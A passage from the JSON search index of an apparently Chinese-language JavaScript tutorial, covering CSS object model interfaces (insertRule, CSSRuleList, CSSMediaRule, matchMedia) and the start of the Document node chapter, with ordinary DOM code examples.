\u5b9e\u4f8b\uff0c\u4ee3\u8868\u90a3\u884c @import \u89c4\u5219\u3002\u5982\u679c\u5f53\u524d\u6837\u5f0f\u8868\u4e0d\u662f\u901a\u8fc7 @import \u5f15\u5165\u7684\uff0c ownerRule \u5c5e\u6027\u8fd4\u56de null \u3002","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"dom/css/#_4","text":"\uff081\uff09CSSStyleSheet.insertRule() CSSStyleSheet.insertRule \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u6837\u5f0f\u8868\u7684\u63d2\u5165\u4e00\u4e2a\u65b0\u7684 CSS \u89c4\u5219\u3002 1 2 3 var sheet = document . querySelector ( '#styleElement' ). sheet ; sheet . insertRule ( '#block { color: white }' , 0 ); sheet . insertRule ( 'p { color: red }' , 1 ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8868\u793a CSS \u89c4\u5219\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u91cc\u53ea\u80fd\u6709\u4e00\u6761\u89c4\u5219\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8be5\u89c4\u5219\u5728\u6837\u5f0f\u8868\u7684\u63d2\u5165\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a0\uff08\u5373\u9ed8\u8ba4\u63d2\u5728\u6837\u5f0f\u8868\u7684\u5934\u90e8\uff09\u3002\u6ce8\u610f\uff0c\u5982\u679c\u63d2\u5165\u4f4d\u7f6e\u5927\u4e8e\u73b0\u6709\u89c4\u5219\u7684\u6570\u76ee\uff0c\u4f1a\u62a5\u9519\u3002 \u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u65b0\u63d2\u5165\u89c4\u5219\u7684\u4f4d\u7f6e\u5e8f\u53f7\u3002 \u6ce8\u610f\uff0c\u6d4f\u89c8\u5668\u5bf9\u811a\u672c\u5728\u6837\u5f0f\u8868\u91cc\u9762\u63d2\u5165\u89c4\u5219\u6709\u5f88\u591a \u9650\u5236 \u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u6700\u597d\u653e\u5728 try...catch \u91cc\u4f7f\u7528\u3002 \uff082\uff09CSSStyleSheet.deleteRule() CSSStyleSheet.deleteRule \u65b9\u6cd5\u7528\u6765\u5728\u6837\u5f0f\u8868\u91cc\u9762\u79fb\u9664\u4e00\u6761\u89c4\u5219\uff0c\u5b83\u7684\u53c2\u6570\u662f\u8be5\u6761\u89c4\u5219\u5728 cssRules \u5bf9\u8c61\u4e2d\u7684\u4f4d\u7f6e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 document . styleSheets [ 0 ]. deleteRule ( 1 );","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"dom/css/#_5","text":"\u7f51\u9875\u6dfb\u52a0\u6837\u5f0f\u8868\u6709\u4e24\u79cd\u65b9\u5f0f\u3002\u4e00\u79cd\u662f\u6dfb\u52a0\u4e00\u5f20\u5185\u7f6e\u6837\u5f0f\u8868\uff0c\u5373\u5728\u6587\u6863\u4e2d\u6dfb\u52a0\u4e00\u4e2a <style> \u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u5199\u6cd5\u4e00 var style = document . createElement ( 'style' ); style . setAttribute ( 'media' , 'screen' ); style . innerHTML = 'body{color:red}' ; document . head . appendChild ( style ); // \u5199\u6cd5\u4e8c var style = ( function () { var style = document . createElement ( 'style' ); document . head . appendChild ( style ); return style ; })(); style . sheet . insertRule ( '.foo{color:red;}' , 0 ); \u53e6\u4e00\u79cd\u662f\u6dfb\u52a0\u5916\u90e8\u6837\u5f0f\u8868\uff0c\u5373\u5728\u6587\u6863\u4e2d\u6dfb\u52a0\u4e00\u4e2a <link> \u8282\u70b9\uff0c\u7136\u540e\u5c06 href \u5c5e\u6027\u6307\u5411\u5916\u90e8\u6837\u5f0f\u8868\u7684 URL\u3002 1 2 3 4 5 6 var linkElm = document . createElement ( 'link' ); linkElm . setAttribute ( 'rel' , 'stylesheet' ); linkElm . setAttribute ( 'type' , 'text/css' ); linkElm . setAttribute ( 'href' , 'reset-min.css' ); document . head . appendChild ( linkElm );","title":"\u5b9e\u4f8b\uff1a\u6dfb\u52a0\u6837\u5f0f\u8868"},{"location":"dom/css/#cssrulelist","text":"CSSRuleList \u63a5\u53e3\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u4e00\u7ec4 CSS \u89c4\u5219\uff0c\u6210\u5458\u90fd\u662f CSSRule \u5b9e\u4f8b\u3002 \u83b7\u53d6 CSSRuleList \u5b9e\u4f8b\uff0c\u4e00\u822c\u662f\u901a\u8fc7 StyleSheet.cssRules \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // h1 { color: red; } // p { color: blue; } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var crl = myStyleSheet . cssRules ; crl instanceof CSSRuleList // true CSSRuleList \u5b9e\u4f8b\u91cc\u9762\uff0c\u6bcf\u4e00\u6761\u89c4\u5219\uff08CSSRule \u5b9e\u4f8b\uff09\u53ef\u4ee5\u901a\u8fc7 rules.item(index) \u6216\u8005 rules[index] \u62ff\u5230\u3002CSS \u89c4\u5219\u7684\u6761\u6570\u901a\u8fc7 rules.length \u62ff\u5230\u3002\u8fd8\u662f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 2 crl [ 0 ] instanceof CSSRule // true crl . length // 2 \u6ce8\u610f\uff0c\u6dfb\u52a0\u89c4\u5219\u548c\u5220\u9664\u89c4\u5219\u4e0d\u80fd\u5728 CSSRuleList \u5b9e\u4f8b\u64cd\u4f5c\uff0c\u800c\u8981\u5728\u5b83\u7684\u7236\u5143\u7d20 StyleSheet \u5b9e\u4f8b\u4e0a\uff0c\u901a\u8fc7 StyleSheet.insertRule() \u548c StyleSheet.deleteRule() \u64cd\u4f5c\u3002","title":"CSSRuleList \u63a5\u53e3"},{"location":"dom/css/#cssrule","text":"","title":"CSSRule \u63a5\u53e3"},{"location":"dom/css/#_6","text":"\u4e00\u6761 CSS \u89c4\u5219\u5305\u62ec\u4e24\u4e2a\u90e8\u5206\uff1aCSS \u9009\u62e9\u5668\u548c\u6837\u5f0f\u58f0\u660e\u3002\u4e0b\u9762\u5c31\u662f\u4e00\u6761\u5178\u578b\u7684 CSS \u89c4\u5219\u3002 1 2 3 4 . myClass { color : red ; background-color : yellow ; } JavaScript \u901a\u8fc7 CSSRule \u63a5\u53e3\u64cd\u4f5c CSS \u89c4\u5219\u3002\u4e00\u822c\u901a\u8fc7 CSSRuleList \u63a5\u53e3\uff08 StyleSheet.cssRules \uff09\u83b7\u53d6 CSSRule \u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // .myClass { // color: red; // background-color: yellow; // } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var ruleList = myStyleSheet . cssRules ; var rule = ruleList [ 0 ]; rule instanceof CSSRule // true","title":"\u6982\u8ff0"},{"location":"dom/css/#cssrule_1","text":"\uff081\uff09CSSRule.cssText CSSRule.cssText \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u7684\u6587\u672c\uff0c\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 2 rule . cssText // \".myClass { color: red; background-color: yellow; }\" \u5982\u679c\u89c4\u5219\u662f\u52a0\u8f7d\uff08 @import \uff09\u5176\u4ed6\u6837\u5f0f\u8868\uff0c cssText \u5c5e\u6027\u8fd4\u56de @import 'url' \u3002 \uff082\uff09CSSRule.parentStyleSheet CSSRule.parentStyleSheet \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u6240\u5728\u7684\u6837\u5f0f\u8868\u5bf9\u8c61\uff08StyleSheet \u5b9e\u4f8b\uff09\uff0c\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 rule . parentStyleSheet === myStyleSheet // true \uff083\uff09CSSRule.parentRule CSSRule.parentRule \u5c5e\u6027\u8fd4\u56de\u5305\u542b\u5f53\u524d\u89c4\u5219\u7684\u7236\u89c4\u5219\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7236\u89c4\u5219\uff08\u5373\u5f53\u524d\u89c4\u5219\u662f\u9876\u5c42\u89c4\u5219\uff09\uff0c\u5219\u8fd4\u56de null \u3002 \u7236\u89c4\u5219\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u662f\uff0c\u5f53\u524d\u89c4\u5219\u5305\u542b\u5728 @media \u89c4\u5219\u4ee3\u7801\u5757\u4e4b\u4e2d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // @supports (display: flex) { // @media screen and (min-width: 900px) { // article { // display: flex; // } // } // } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var ruleList = myStyleSheet . cssRules ; var rule0 = ruleList [ 0 ]; rule0 . cssText // \"@supports (display: flex) { // @media screen and (min-width: 900px) { // article { display: flex; } // } // }\" // \u7531\u4e8e\u8fd9\u6761\u89c4\u5219\u5185\u5d4c\u5176\u4ed6\u89c4\u5219\uff0c // \u6240\u4ee5\u5b83\u6709 cssRules \u5c5e\u6027\uff0c\u4e14\u8be5\u5c5e\u6027\u662f CSSRuleList \u5b9e\u4f8b rule0 . cssRules instanceof CSSRuleList // true var rule1 = rule0 . cssRules [ 0 ]; rule1 . cssText // \"@media screen and (min-width: 900px) { // article { display: flex; } // }\" var rule2 = rule1 . cssRules [ 0 ]; rule2 . cssText // \"article { display: flex; }\" rule1 . parentRule === rule0 // true rule2 . parentRule === rule1 // true \uff084\uff09CSSRule.type CSSRule.type \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5f53\u524d\u89c4\u5219\u7684\u7c7b\u578b\u3002 \u6700\u5e38\u89c1\u7684\u7c7b\u578b\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002 1\uff1a\u666e\u901a\u6837\u5f0f\u89c4\u5219\uff08CSSStyleRule \u5b9e\u4f8b\uff09 3\uff1a @import \u89c4\u5219 4\uff1a @media \u89c4\u5219\uff08CSSMediaRule \u5b9e\u4f8b\uff09 5\uff1a @font-face \u89c4\u5219","title":"CSSRule \u5b9e\u4f8b\u7684\u5c5e\u6027"},{"location":"dom/css/#cssstylerule","text":"\u5982\u679c\u4e00\u6761 CSS \u89c4\u5219\u662f\u666e\u901a\u7684\u6837\u5f0f\u89c4\u5219\uff08\u4e0d\u542b\u7279\u6b8a\u7684 CSS \u547d\u4ee4\uff09\uff0c\u90a3\u4e48\u9664\u4e86 CSSRule \u63a5\u53e3\uff0c\u5b83\u8fd8\u90e8\u7f72\u4e86 CSSStyleRule \u63a5\u53e3\u3002 CSSStyleRule \u63a5\u53e3\u6709\u4ee5\u4e0b\u4e24\u4e2a\u5c5e\u6027\u3002 \uff081\uff09CSSStyleRule.selectorText CSSStyleRule.selectorText \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u7684\u9009\u62e9\u5668\u3002 1 2 var stylesheet = document . styleSheets [ 0 ]; stylesheet . cssRules [ 0 ]. selectorText // \".myClass\" \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\u3002 \uff082\uff09CSSStyleRule.style CSSStyleRule.style \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff08CSSStyleDeclaration \u5b9e\u4f8b\uff09\uff0c\u4ee3\u8868\u5f53\u524d\u89c4\u5219\u7684\u6837\u5f0f\u58f0\u660e\uff0c\u4e5f\u5c31\u662f\u9009\u62e9\u5668\u540e\u9762\u7684\u5927\u62ec\u53f7\u91cc\u9762\u7684\u90e8\u5206\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u4e3a // <style id=\"myStyle\"> // p { color: red; } // </style> var styleSheet = document . getElementById ( 'myStyle' ). sheet ; styleSheet . cssRules [ 0 ]. style instanceof CSSStyleDeclaration // true CSSStyleDeclaration \u5b9e\u4f8b\u7684 cssText \u5c5e\u6027\uff0c\u53ef\u4ee5\u8fd4\u56de\u6240\u6709\u6837\u5f0f\u58f0\u660e\uff0c\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 styleSheet . cssRules [ 0 ]. style . cssText // \"color: red;\" styleSheet . cssRules [ 0 ]. selectorText // \"p\"","title":"CSSStyleRule \u63a5\u53e3"},{"location":"dom/css/#cssmediarule","text":"\u5982\u679c\u4e00\u6761 CSS \u89c4\u5219\u662f @media \u4ee3\u7801\u5757\uff0c\u90a3\u4e48\u5b83\u9664\u4e86 CSSRule \u63a5\u53e3\uff0c\u8fd8\u90e8\u7f72\u4e86 CSSMediaRule \u63a5\u53e3\u3002 \u8be5\u63a5\u53e3\u4e3b\u8981\u63d0\u4f9b media \u5c5e\u6027\u548c conditionText \u5c5e\u6027\u3002\u524d\u8005\u8fd4\u56de\u4ee3\u8868 @media \u89c4\u5219\u7684\u4e00\u4e2a\u5bf9\u8c61\uff08MediaList \u5b9e\u4f8b\uff09\uff0c\u540e\u8005\u8fd4\u56de @media \u89c4\u5219\u7684\u751f\u6548\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // @media screen and (min-width: 900px) { // article { display: flex; } // } // </style> var styleSheet = document . getElementById ( 'myStyle' ). sheet ; styleSheet . cssRules [ 0 ] instanceof CSSMediaRule // true styleSheet . cssRules [ 0 ]. media // { // 0: \"screen and (min-width: 900px)\", // appendMedium: function, // deleteMedium: function, // item: function, // length: 1, // mediaText: \"screen and (min-width: 900px)\" // } styleSheet . cssRules [ 0 ]. conditionText // \"screen and (min-width: 900px)\"","title":"CSSMediaRule \u63a5\u53e3"},{"location":"dom/css/#windowmatchmedia","text":"","title":"window.matchMedia()"},{"location":"dom/css/#_7","text":"window.matchMedia() \u65b9\u6cd5\u7528\u6765\u5c06 CSS \u7684 Media Query \u6761\u4ef6\u8bed\u53e5\uff0c\u8f6c\u6362\u6210\u4e00\u4e2a MediaQueryList \u5b9e\u4f8b\u3002 1 2 var mdl = window . matchMedia ( '(min-width: 400px)' ); mdl instanceof MediaQueryList // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf mdl \u5c31\u662f mediaQueryList \u7684\u5b9e\u4f8b\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\uff0c window.matchMedia \u4e0d\u4f1a\u62a5\u9519\uff0c\u4f9d\u7136\u8fd4\u56de\u4e00\u4e2a MediaQueryList \u5b9e\u4f8b\u3002 1 window . matchMedia ( 'bad string' ) instanceof MediaQueryList // true","title":"\u57fa\u672c\u7528\u6cd5"},{"location":"dom/css/#mediaquerylist","text":"MediaQueryList \u5b9e\u4f8b\u6709\u4e09\u4e2a\u5c5e\u6027\u3002 \uff081\uff09MediaQueryList.media MediaQueryList.media \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5bf9\u5e94\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\u3002 1 2 var mql = window . matchMedia ( '(min-width: 400px)' ); mql . media // \"(min-width: 400px)\" \uff082\uff09MediaQueryList.matches MediaQueryList.matches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u9875\u9762\u662f\u5426\u7b26\u5408\u6307\u5b9a\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\u3002 1 2 3 4 5 if ( window . matchMedia ( '(min-width: 400px)' ). matches ) { /* \u5f53\u524d\u89c6\u53e3\u4e0d\u5c0f\u4e8e 400 \u50cf\u7d20 */ } else { /* \u5f53\u524d\u89c6\u53e3\u5c0f\u4e8e 400 \u50cf\u7d20 */ } \u4e0b\u9762\u7684\u4f8b\u5b50\u6839\u636e mediaQuery \u662f\u5426\u5339\u914d\u5f53\u524d\u73af\u5883\uff0c\u52a0\u8f7d\u76f8\u5e94\u7684 CSS \u6837\u5f0f\u8868\u3002 1 2 3 4 5 6 7 8 9 10 var result = window . matchMedia ( \"(max-width: 700px)\" ); if ( result . matches ){ var linkElm = document . createElement ( 'link' ); linkElm . setAttribute ( 'rel' , 'stylesheet' ); linkElm . setAttribute ( 'type' , 'text/css' ); linkElm . setAttribute ( 'href' , 'small.css' ); document . head . appendChild ( linkElm ); } \uff083\uff09MediaQueryList.onchange \u5982\u679c MediaQuery \u6761\u4ef6\u8bed\u53e5\u7684\u9002\u914d\u73af\u5883\u53d1\u751f\u53d8\u5316\uff0c\u4f1a\u89e6\u53d1 change \u4e8b\u4ef6\u3002 MediaQueryList.onchange \u5c5e\u6027\u7528\u6765\u6307\u5b9a change \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u8be5\u51fd\u6570\u7684\u53c2\u6570\u662f change \u4e8b\u4ef6\u5bf9\u8c61\uff08MediaQueryListEvent \u5b9e\u4f8b\uff09\uff0c\u8be5\u5bf9\u8c61\u4e0e MediaQueryList \u5b9e\u4f8b\u7c7b\u4f3c\uff0c\u4e5f\u6709 media \u548c matches \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 var mql = window . matchMedia ( '(max-width: 600px)' ); mql . onchange = function ( e ) { if ( e . matches ) { /* \u89c6\u53e3\u4e0d\u8d85\u8fc7 600 \u50cf\u7d20 */ } else { /* \u89c6\u53e3\u8d85\u8fc7 600 \u50cf\u7d20 */ } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c change \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u5b58\u5728\u4e24\u79cd\u53ef\u80fd\u3002\u4e00\u79cd\u662f\u663e\u793a\u5bbd\u5ea6\u4ece600\u50cf\u7d20\u4ee5\u4e0a\u53d8\u4e3a\u4ee5\u4e0b\uff0c\u53e6\u4e00\u79cd\u662f\u4ece600\u50cf\u7d20\u4ee5\u4e0b\u53d8\u4e3a\u4ee5\u4e0a\uff0c\u6240\u4ee5\u5728\u76d1\u542c\u51fd\u6570\u5185\u90e8\u8981\u5224\u65ad\u4e00\u4e0b\u5f53\u524d\u662f\u54ea\u4e00\u79cd\u60c5\u51b5\u3002","title":"MediaQueryList \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"dom/css/#mediaquerylist_1","text":"MediaQueryList \u5b9e\u4f8b\u6709\u4e24\u4e2a\u65b9\u6cd5 MediaQueryList.addListener() \u548c MediaQueryList.removeListener() \uff0c\u7528\u6765\u4e3a change \u4e8b\u4ef6\u6dfb\u52a0\u6216\u64a4\u9500\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var mql = window . matchMedia ( '(max-width: 600px)' ); // \u6307\u5b9a\u76d1\u542c\u51fd\u6570 mql . addListener ( mqCallback ); // \u64a4\u9500\u76d1\u542c\u51fd\u6570 mql . removeListener ( mqCallback ); function mqCallback ( e ) { if ( e . matches ) { /* \u89c6\u53e3\u4e0d\u8d85\u8fc7 600 \u50cf\u7d20 */ } else { /* \u89c6\u53e3\u8d85\u8fc7 600 \u50cf\u7d20 */ } } \u6ce8\u610f\uff0c MediaQueryList.removeListener() \u65b9\u6cd5\u4e0d\u80fd\u64a4\u9500 MediaQueryList.onchange \u5c5e\u6027\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570\u3002","title":"MediaQueryList \u63a5\u53e3\u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"dom/document/","text":"Document \u8282\u70b9 \u00b6 \u6982\u8ff0 \u00b6 document \u8282\u70b9\u5bf9\u8c61\u4ee3\u8868\u6574\u4e2a\u6587\u6863\uff0c\u6bcf\u5f20\u7f51\u9875\u90fd\u6709\u81ea\u5df1\u7684 document \u5bf9\u8c61\u3002 window.document \u5c5e\u6027\u5c31\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002\u53ea\u8981\u6d4f\u89c8\u5668\u5f00\u59cb\u8f7d\u5165 HTML \u6587\u6863\uff0c\u8be5\u5bf9\u8c61\u5c31\u5b58\u5728\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 document \u5bf9\u8c61\u6709\u4e0d\u540c\u7684\u529e\u6cd5\u53ef\u4ee5\u83b7\u53d6\u3002 \u6b63\u5e38\u7684\u7f51\u9875\uff0c\u76f4\u63a5\u4f7f\u7528 document \u6216 window.document \u3002 iframe \u6846\u67b6\u91cc\u9762\u7684\u7f51\u9875\uff0c\u4f7f\u7528 iframe \u8282\u70b9\u7684 contentDocument \u5c5e\u6027\u3002 Ajax \u64cd\u4f5c\u8fd4\u56de\u7684\u6587\u6863\uff0c\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u7684 responseXML \u5c5e\u6027\u3002 \u5185\u90e8\u8282\u70b9\u7684 ownerDocument \u5c5e\u6027\u3002 document \u5bf9\u8c61\u7ee7\u627f\u4e86 EventTarget \u63a5\u53e3\u548c Node \u63a5\u53e3\uff0c\u5e76\u4e14\u6df7\u5165\uff08mixin\uff09\u4e86 ParentNode \u63a5\u53e3\u3002\u8fd9\u610f\u5473\u7740\uff0c\u8fd9\u4e9b\u63a5\u53e3\u7684\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\u3002\u9664\u6b64\u4e4b\u5916\uff0c document \u5bf9\u8c61\u8fd8\u6709\u5f88\u591a\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u5c5e\u6027 \u00b6 \u5feb\u6377\u65b9\u5f0f\u5c5e\u6027 \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u662f\u6307\u5411\u6587\u6863\u5185\u90e8\u7684\u67d0\u4e2a\u8282\u70b9\u7684\u5feb\u6377\u65b9\u5f0f\u3002 \uff081\uff09document.defaultView document.defaultView \u5c5e\u6027\u8fd4\u56de document \u5bf9\u8c61\u6240\u5c5e\u7684 window \u5bf9\u8c61\u3002\u5982\u679c\u5f53\u524d\u6587\u6863\u4e0d\u5c5e\u4e8e window \u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 document . defaultView === window // true \uff082\uff09document.doctype \u5bf9\u4e8e HTML \u6587\u6863\u6765\u8bf4\uff0c document \u5bf9\u8c61\u4e00\u822c\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\u3002\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u662f document.doctype \uff0c\u6307\u5411 <DOCTYPE> \u8282\u70b9\uff0c\u5373\u6587\u6863\u7c7b\u578b\uff08Document Type Declaration\uff0c\u7b80\u5199DTD\uff09\u8282\u70b9\u3002HTML \u7684\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff0c\u4e00\u822c\u5199\u6210 <!DOCTYPE html> \u3002\u5982\u679c\u7f51\u9875\u6ca1\u6709\u58f0\u660e DTD\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 var doctype = document . doctype ; doctype // \"<!DOCTYPE html>\" doctype . name // \"html\" document.firstChild \u901a\u5e38\u5c31\u8fd4\u56de\u8fd9\u4e2a\u8282\u70b9\u3002 \uff083\uff09document.documentElement document.documentElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6839\u5143\u7d20\u8282\u70b9\uff08root\uff09\u3002\u5b83\u901a\u5e38\u662f document \u8282\u70b9\u7684\u7b2c\u4e8c\u4e2a\u5b50\u8282\u70b9\uff0c\u7d27\u8ddf\u5728 document.doctype \u8282\u70b9\u540e\u9762\u3002HTML\u7f51\u9875\u7684\u8be5\u5c5e\u6027\uff0c\u4e00\u822c\u662f <html> \u8282\u70b9\u3002 \uff084\uff09document.body\uff0cdocument.head document.body \u5c5e\u6027\u6307\u5411 <body> \u8282\u70b9\uff0c document.head \u5c5e\u6027\u6307\u5411 <head> \u8282\u70b9\u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u603b\u662f\u5b58\u5728\u7684\uff0c\u5982\u679c\u7f51\u9875\u6e90\u7801\u91cc\u9762\u7701\u7565\u4e86 <head> \u6216 <body> \uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u521b\u5efa\u3002\u53e6\u5916\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u5982\u679c\u6539\u5199\u5b83\u4eec\u7684\u503c\uff0c\u76f8\u5f53\u4e8e\u79fb\u9664\u6240\u6709\u5b50\u8282\u70b9\u3002 \uff085\uff09document.scrollingElement document.scrollingElement \u5c5e\u6027\u8fd4\u56de\u6587\u6863\u7684\u6eda\u52a8\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6587\u6863\u6574\u4f53\u6eda\u52a8\u65f6\uff0c\u5230\u5e95\u662f\u54ea\u4e2a\u5143\u7d20\u5728\u6eda\u52a8\u3002 \u6807\u51c6\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u6587\u6863\u7684\u6839\u5143\u7d20 document.documentElement \uff08\u5373 <html> \uff09\u3002\u517c\u5bb9\uff08quirk\uff09\u6a21\u5f0f\u4e0b\uff0c\u8fd4\u56de\u7684\u662f <body> \u5143\u7d20\uff0c\u5982\u679c\u8be5\u5143\u7d20\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de null \u3002 1 2 // \u9875\u9762\u6eda\u52a8\u5230\u6d4f\u89c8\u5668\u9876\u90e8 document . scrollingElement . scrollTop = 0 ; \uff086\uff09document.activeElement document.activeElement \u5c5e\u6027\u8fd4\u56de\u83b7\u5f97\u5f53\u524d\u7126\u70b9\uff08focus\uff09\u7684 DOM \u5143\u7d20\u3002\u901a\u5e38\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u662f <input> \u3001 <textarea> \u3001 <select> \u7b49\u8868\u5355\u5143\u7d20\uff0c\u5982\u679c\u5f53\u524d\u6ca1\u6709\u7126\u70b9\u5143\u7d20\uff0c\u8fd4\u56de <body> \u5143\u7d20\u6216 null \u3002 \uff087\uff09document.fullscreenElement document.fullscreenElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4ee5\u5168\u5c4f\u72b6\u6001\u5c55\u793a\u7684 DOM \u5143\u7d20\u3002\u5982\u679c\u4e0d\u662f\u5168\u5c4f\u72b6\u6001\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 if ( document . fullscreenElement . nodeName == 'VIDEO' ) { console . log ( '\u5168\u5c4f\u64ad\u653e\u89c6\u9891' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 document.fullscreenElement \u53ef\u4ee5\u77e5\u9053 <video> \u5143\u7d20\u6709\u6ca1\u6709\u5904\u5728\u5168\u5c4f\u72b6\u6001\uff0c\u4ece\u800c\u5224\u65ad\u7528\u6237\u884c\u4e3a\u3002 \u8282\u70b9\u96c6\u5408\u5c5e\u6027 \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u8868\u793a\u6587\u6863\u5185\u90e8\u7279\u5b9a\u5143\u7d20\u7684\u96c6\u5408\u3002\u8fd9\u4e9b\u96c6\u5408\u90fd\u662f\u52a8\u6001\u7684\uff0c\u539f\u8282\u70b9\u6709\u4efb\u4f55\u53d8\u5316\uff0c\u7acb\u523b\u4f1a\u53cd\u6620\u5728\u96c6\u5408\u4e2d\u3002 \uff081\uff09document.links document.links \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u6240\u6709\u8bbe\u5b9a\u4e86 href \u5c5e\u6027\u7684 <a> \u53ca <area> \u8282\u70b9\u3002 1 2 3 4 5 // \u6253\u5370\u6587\u6863\u6240\u6709\u7684\u94fe\u63a5 var links = document . links ; for ( var i = 0 ; i < links . length ; i ++ ) { console . log ( links [ i ]); } \uff082\uff09document.forms document.forms \u5c5e\u6027\u8fd4\u56de\u6240\u6709 <form> \u8868\u5355\u8282\u70b9\u3002 1 var selectForm = document . forms [ 0 ]; \u4e0a\u9762\u4ee3\u7801\u83b7\u53d6\u6587\u6863\u7b2c\u4e00\u4e2a\u8868\u5355\u3002 \u9664\u4e86\u4f7f\u7528\u4f4d\u7f6e\u5e8f\u53f7\uff0c id \u5c5e\u6027\u548c name \u5c5e\u6027\u4e5f\u53ef\u4ee5\u7528\u6765\u5f15\u7528\u8868\u5355\u3002 1 2 3 4 5 /* HTML \u4ee3\u7801\u5982\u4e0b <form 